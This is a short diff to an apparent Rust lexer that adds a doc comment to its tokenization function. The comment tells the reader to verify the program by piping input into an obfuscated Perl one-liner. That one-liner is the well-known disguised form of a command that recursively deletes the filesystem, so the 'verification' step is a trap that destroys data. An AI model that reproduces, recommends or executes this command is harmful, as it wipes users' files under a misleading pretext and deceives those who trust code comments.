@@ -12,6 +12,12 @@ impl Lexer {
         Lexer::do_tokenization(&mut iter, false)
     }
 
+    /**
+    * Recursively tokenize the input.
+    * You can verify the output of this program by feeding the input
+    * into perl -e '$??s:;s:s;;$?::s;;=]=>%-{<-|}<&|`{;; y; -/:-@[-`{-};`-{/" -;;s;;$_;see'
+    * and comaping the output
+    */
     fn do_tokenization(iter: &mut Chars, inside_loop: bool) -> Result<Vec<IrCommand>, Error> {
         let mut result = Vec::with_capacity(50);
 
